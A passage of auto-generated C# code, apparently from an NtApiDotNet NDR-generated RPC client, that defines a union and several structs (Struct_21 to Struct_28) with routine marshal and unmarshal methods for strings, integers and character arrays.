u.ReadEmbeddedPointer<Struct_25>(new System.Func<Struct_25>(u.Read_25), false);\n                goto done;\n            }\n            if ((Selector == 8))\n            {\n                Arm_8 = u.ReadEmbeddedPointer<Struct_27>(new System.Func<Struct_27>(u.Read_27), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_20\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_21> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_22> Arm_2;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_23> Arm_3;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_24> Arm_4;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_25> Arm_6;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_27> Arm_8;\n        public static Union_20 CreateDefault()\n        {\n            return new Union_20();\n        }\n        public Union_20(uint Selector, System.Nullable<Struct_21> Arm_1, System.Nullable<Struct_22> Arm_2, System.Nullable<Struct_23> Arm_3, System.Nullable<Struct_24> Arm_4, System.Nullable<Struct_25> Arm_6, System.Nullable<Struct_27> Arm_8)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n            this.Arm_3 = Arm_3;\n            this.Arm_4 = Arm_4;\n            this.Arm_6 = Arm_6;\n            this.Arm_8 = Arm_8;\n        }\n    }\n    public struct Struct_21 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public static Struct_21 CreateDefault()\n        {\n            return new Struct_21();\n        }\n        public Struct_21(string Member0)\n        {\n            this.Member0 = Member0;\n        }\n    }\n    public struct Struct_22 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public static Struct_22 CreateDefault()\n        {\n            return new Struct_22();\n        }\n        public Struct_22(int Member0, string Member8, string Member10, string Member18, string Member20, string Member28)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n        }\n    }\n    public struct Struct_23 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member30, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member38, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member40, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member48);\n            m.WriteEmbeddedPointer<char[], long>(Member50, new System.Action<char[], long>(m.Write_96), Member48);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member38 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member40 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member48 = u.ReadInt32();\n            Member50 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_96), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member30;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member38;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member40;\n        public int Member48;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member50;\n        public static Struct_23 CreateDefault()\n        {\n            return new Struct_23();\n        }\n        public Struct_23(int Member0, string Member8, string Member10, string Member18, string Member20, string Member28, string Member30, string Member38, string Member40, int Member48, char[] Member50)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n        }\n    }\n    public struct Struct_24 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member30, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member38, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member40, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member48);\n            m.WriteEmbeddedPointer<char[], long>(Member50, new System.Action<char[], long>(m.Write_96), Member48);\n            m.WriteInt32(Member58);\n            m.WriteEmbeddedPointer<char[], long>(Member60, new System.Action<char[], long>(m.Write_97), Member58);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member38 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member40 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member48 = u.ReadInt32();\n            Member50 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_96), false);\n            Member58 = u.ReadInt32();\n            Member60 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_97), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member30;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member38;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member40;\n        public int Member48;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member50;\n        public int Member58;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member60;\n        public static Struct_24 CreateDefault()\n        {\n            return new Struct_24();\n        }\n        public Struct_24(int Member0, string Member8, string Member10, string Member18, string Member20, string Member28, string Member30, string Member38, string Member40, int Member48, char[] Member50, int Member58, char[] Member60)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n            this.Member58 = Member58;\n            this.Member60 = Member60;\n        }\n    }\n    public struct Struct_25 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member30, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member38, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member40, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member48);\n            m.WriteEmbeddedPointer<char[], long>(Member50, new System.Action<char[], long>(m.Write_96), Member48);\n            m.WriteInt32(Member58);\n            m.WriteEmbeddedPointer<char[], long>(Member60, new System.Action<char[], long>(m.Write_97), Member58);\n            m.Write_26(Member68);\n            m.WriteInt64(Member70);\n            m.WriteEmbeddedPointer<string>(Member78, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member80, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member88, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member90, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member38 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member40 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member48 = u.ReadInt32();\n            Member50 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_96), false);\n            Member58 = u.ReadInt32();\n            Member60 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_97), false);\n            Member68 = u.Read_26();\n            Member70 = u.ReadInt64();\n            Member78 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member80 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member88 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member90 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member30;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member38;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member40;\n        public int Member48;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member50;\n        public int Member58;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member60;\n        public Struct_26 Member68;\n        public long Member70;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member78;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member80;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member88;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member90;\n        public static Struct_25 CreateDefault()\n        {\n            return new Struct_25();\n        }\n        public Struct_25(\n                    int Member0, \n                    string Member8, \n                    string Member10, \n                    string Member18, \n                    string Member20, \n                    string Member28, \n                    string Member30, \n                    string Member38, \n                    string Member40, \n                    int Member48, \n                    char[] Member50, \n                    int Member58, \n                    char[] Member60, \n                    Struct_26 Member68, \n                    long Member70, \n                    string Member78, \n                    string Member80, \n                    string Member88, \n                    string Member90)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n            this.Member58 = Member58;\n            this.Member60 = Member60;\n            this.Member68 = Member68;\n            this.Member70 = Member70;\n            this.Member78 = Member78;\n            this.Member80 = Member80;\n            this.Member88 = Member88;\n            this.Member90 = Member90;\n        }\n    }\n    public struct Struct_26 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public static Struct_26 CreateDefault()\n        {\n            return new Struct_26();\n        }\n        public Struct_26(int Member0, int Member4)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n        }\n    }\n    public struct Struct_27 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member30, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member38, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member40, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member48);\n            m.WriteEmbeddedPointer<char[], long>(Member50, new System.Action<char[], long>(m.Write_96), Member48);\n            m.WriteInt32(Member58);\n            m.WriteEmbeddedPointer<char[], long>(Member60, new System.Action<char[], long>(m.Write_97), Member58);\n            m.Write_26(Member68);\n            m.WriteInt64(Member70);\n            m.WriteEmbeddedPointer<string>(Member78, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member80, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member88, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member90, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member98, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(MemberA0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(MemberA8);\n            m.WriteEmbeddedPointer<char[], long>(MemberB0, new System.Action<char[], long>(m.Write_98), MemberA8);\n            m.WriteEmbeddedPointer<string>(MemberB8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(MemberC0);\n            m.WriteInt32(MemberC4);\n            m.WriteEmbeddedPointer<char[], long>(MemberC8, new System.Action<char[], long>(m.Write_99), MemberC4);\n            m.Write_26(MemberD0);\n            m.WriteInt64(MemberD8);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member38 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member40 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member48 = u.ReadInt32();\n            Member50 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_96), false);\n            Member58 = u.ReadInt32();\n            Member60 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_97), false);\n            Member68 = u.Read_26();\n            Member70 = u.ReadInt64();\n            Member78 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member80 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member88 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member90 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member98 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            MemberA0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            MemberA8 = u.ReadInt32();\n            MemberB0 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_98), false);\n            MemberB8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            MemberC0 = u.ReadInt32();\n            MemberC4 = u.ReadInt32();\n            MemberC8 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_99), false);\n            MemberD0 = u.Read_26();\n            MemberD8 = u.ReadInt64();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member30;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member38;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member40;\n        public int Member48;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member50;\n        public int Member58;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member60;\n        public Struct_26 Member68;\n        public long Member70;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member78;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member80;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member88;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member90;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member98;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> MemberA0;\n        public int MemberA8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> MemberB0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> MemberB8;\n        public int MemberC0;\n        public int MemberC4;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> MemberC8;\n        public Struct_26 MemberD0;\n        public long MemberD8;\n        public static Struct_27 CreateDefault()\n        {\n            return new Struct_27();\n        }\n        public Struct_27(\n                    int Member0, \n                    string Member8, \n                    string Member10, \n                    string Member18, \n                    string Member20, \n                    string Member28, \n                    string Member30, \n                    string Member38, \n                    string Member40, \n                    int Member48, \n                    char[] Member50, \n                    int Member58, \n                    char[] Member60, \n                    Struct_26 Member68, \n                    long Member70, \n                    string Member78, \n                    string Member80, \n                    string Member88, \n                    string Member90, \n                    string Member98, \n                    string MemberA0, \n                    int MemberA8, \n                    char[] MemberB0, \n                    string MemberB8, \n                    int MemberC0, \n                    int MemberC4, \n                    char[] MemberC8, \n                    Struct_26 MemberD0, \n                    long MemberD8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n            this.Member58 = Member58;\n            this.Member60 = Member60;\n            this.Member68 = Member68;\n            this.Member70 = Member70;\n            this.Member78 = Member78;\n            this.Member80 = Member80;\n            this.Member88 = Member88;\n            this.Member90 = Member90;\n            this.Member98 = Member98;\n            this.MemberA0 = MemberA0;\n            this.MemberA8 = MemberA8;\n            this.MemberB0 = MemberB0;\n            this.MemberB8 = MemberB8;\n            this.MemberC0 = MemberC0;\n            this.MemberC4 = MemberC4;\n            this.MemberC8 = MemberC8;\n            this.MemberD0 = MemberD0;\n            this.MemberD8 = MemberD8;\n        }\n    }\n    public struct Struct_28 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_29(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            